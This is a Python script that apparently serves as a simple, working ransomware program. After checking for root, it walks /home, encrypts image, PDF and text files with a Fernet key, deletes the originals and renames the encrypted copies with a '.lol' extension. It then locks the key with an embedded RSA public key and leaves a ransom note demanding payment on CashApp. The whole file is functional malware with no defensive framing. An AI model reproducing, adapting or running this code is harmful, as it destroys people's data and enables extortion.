import os
import rsa
from cryptography.fernet import Fernet
import sys

# Checks if program is being run as sudo 
if os.geteuid() != 0: 
     print("Please run this with sudo in order for the process to work!")
     sys.exit(1)
     
# Asymmetric public key used to lock the fernet key after files have been encrypted
public_key_pem = """
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAgcoWsUdseU21eqiUDDuv3yReCOwyaX5F95nEr0dBqgbnV3wAUdCB
8FopjKtopEGVUR412i+s2O+hp5ZTPfo9XxJB8hj2IIIhyxHNcrPdxGTbNQSkxkDB
d5q55kI+SoYDoyG7/QUZBuDvCvSCm01NC+r2guT8fpMqQCeu0S++l3QA0FFD8mdb
AM0mBkkgtU4wh84rvqTik2rJuJqXh7fEbNXS1d+LiVXwBrm7LxKR1WuOpXCjoB6I
126d34iud2cBOOUlOGK1DnIIUeKBVjc6XXYtZz+JWjoiobaETBpA94i8W3htDL/W
btJqj6xc3SZpaGhFJiEnfaCSGZmWGEwufQIDAQAB
-----END RSA PUBLIC KEY-----"""


# Defining which files to encrypt
file_extensions = ['.jpeg', '.gif', '.pdf', '.txt', '.jpg']

# Pulling path of all files in the system and checking for matching extentions
file_paths = []
for root, dirs, files_list, in os.walk('/home'):
     for file in files_list:
          file_path = os.path.join(root, file)
          file_ext = os.path.splitext(file_path)[1].lower()
          if file_ext in file_extensions:
               file_paths.append(file_path)

# Create fernet symmetric key
fernet_key = Fernet.generate_key()
with open("fernet_key", "wb") as file:
    file.write(fernet_key)
with open('fernet_key', 'rb') as file:
    key = file.read()


# Encrypting each chosen file with the fernet key
for file_path in file_paths:
    with open(file_path, 'rb') as file:
        file_data = file.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(file_data)
    # Adds custom extension name and removes old file name
    new_file = file_path + ".lol"
    with open(new_file, 'wb') as file:
        file.write(encrypted_data)
    os.remove(file_path)

# Calling RSA public key    
public_key = rsa.PublicKey.load_pkcs1(public_key_pem.encode())

# Encrypting fernet key with public key
with open('fernet_key', 'rb') as f:
    data = f.read()
encrytped_data = rsa.encrypt(data, public_key)
with open('fernet_key', 'wb') as f:
        f.write(encrytped_data)


# Ransomnote
print("Your system has been encrypted by the 1337 H@xors, to recover your files refer to hacked.txt")
with open("Hacked.txt", "w") as f:
     f.write("Your systems has been comrpomised. To recover your data send $5 to H@x0r5 on cashapp. From there we will decrypt the key and allow you to unencrypt your data. >:)")
